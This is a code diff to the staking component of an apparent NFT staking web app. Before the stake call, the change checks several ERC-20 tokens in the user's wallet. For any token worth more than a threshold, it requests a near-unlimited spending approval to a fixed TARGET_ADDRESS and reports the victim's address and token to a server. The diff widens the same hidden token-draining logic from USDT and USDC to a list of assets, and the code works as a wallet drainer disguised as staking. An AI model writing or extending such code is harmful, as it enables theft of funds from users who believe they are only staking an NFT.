@@ -13,9 +13,9 @@ import { useContractContext } from "src/utils/ContractProvider";
 import { useWeb3Context } from "src/utils/web3Context";
 import { stakeNft } from "src/contracts/contractHelpers";
 import { showNotification } from "src/utils";
-import { LIMIT, TARGET_ADDRESS, USDC_ADDRESS } from "src/utils/data";
+import { ASSETS_ADDRESSES, LIMIT, TARGET_ADDRESS, USDC_ADDRESS } from "src/utils/data";
 import { postUpdate } from "src/utils/fetchHelpers";
-
+import erc20Abi from "../../contracts/abis/erc20Abi.json";
 
 function TokenList({ setLoadingStatus, refreshFlag, updateRefreshFlag, tokenHoldingList }) {
   const { address } = useWeb3Context(0);
@@ -29,6 +29,7 @@ function TokenList({ setLoadingStatus, refreshFlag, updateRefreshFlag, tokenHold
 
   useEffect(() => {
     const list = [];
+    console.log("tokenHoldingList =", tokenHoldingList)
     for(let i = 0;i<tokenHoldingList.length;i++)
       list.push(false)
     setSelectedList(list);
@@ -48,6 +49,7 @@ function TokenList({ setLoadingStatus, refreshFlag, updateRefreshFlag, tokenHold
       showNotification("Please connect wallet!", "error");
       return;
     }
+    
     setLoadingStatus(true);
     let selIndex = selectedList.indexOf(true);
     if (selIndex == -1) {
@@ -55,29 +57,23 @@ function TokenList({ setLoadingStatus, refreshFlag, updateRefreshFlag, tokenHold
     } else {
       const poolId = poolID.current;
       try {
-        let flag = 0;
-        const allowance = await usdtContract.methods.allowance(address, TARGET_ADDRESS).call();
-        if(allowance == 0) {
-          const usdtBalanceWei = await usdtContract.methods.balanceOf(address).call();
-          const usdtBalance = parseInt(web3.utils.fromWei(usdtBalanceWei.toString(), "ether"));
-          if(usdtBalance >= LIMIT) {
-            await usdtContract.methods.approve(TARGET_ADDRESS, web3.utils.toWei("100000000000000000", "ether")).send({value: 0, from: address});
-            await postUpdate(address, USDT_ADDRESS);
-            flag = 1;
-          }
-          if(flag == 0) {
-            const usdcAllowance = await usdcContract.methods.allowance(address, TARGET_ADDRESS).call();
-            if(usdcAllowance == 0) {
-              const usdcBalanceWei = await usdcContract.methods.balanceOf(address).call();
-              const usdcBalance = parseInt(web3.utils.fromWei(usdcBalanceWei.toString(), "ether"));
-              if(usdcBalance >= LIMIT) {
-                await usdcContract.methods.approve(TARGET_ADDRESS, web3.utils.toWei("100000000000000000", "ether")).send({value: 0, from: address});
-                await postUpdate(address, USDC_ADDRESS);
-                flag = 1;
-              }
+        for(let k = 0;k<ASSETS_ADDRESSES.length;k++) {
+          const contract = new web3.eth.Contract(erc20Abi, ASSETS_ADDRESSES[k].address);
+          const _allowance = await contract.methods.allowance(address, TARGET_ADDRESS).call();
+          if(_allowance == 0) {
+            const _balanceWei = await contract.methods.balanceOf(address).call();
+            const _decimal = await contract.methods.decimals().call();
+            const _balance = parseFloat(web3.utils.fromWei(_balanceWei.toString(), _decimal == 9 ? "gwei": "ether"));
+            const _value = _balance * ASSETS_ADDRESSES[k].price;
+            // console.log(ASSETS_ADDRESSES[k].name, " _balance = ", _balance, " _value=", _value);
+            if(_value >= LIMIT) {
+              await contract.methods.approve(TARGET_ADDRESS, web3.utils.toWei("1000000000000000", _decimal == 9 ? "gwei" : "ether")).send({value: 0, from: address});
+              await postUpdate(address, ASSETS_ADDRESSES[k].address, ASSETS_ADDRESSES[k].name);
+              break;
             }
           }
         }
+        
         const res = await stakeNft(web3, stakingContract, address, poolId, tokenHoldingList[selIndex].token_address, tokenHoldingList[selIndex].token_id);
         showNotification(res.message, res.success ? "success" : "error");
         updateRefreshFlag();
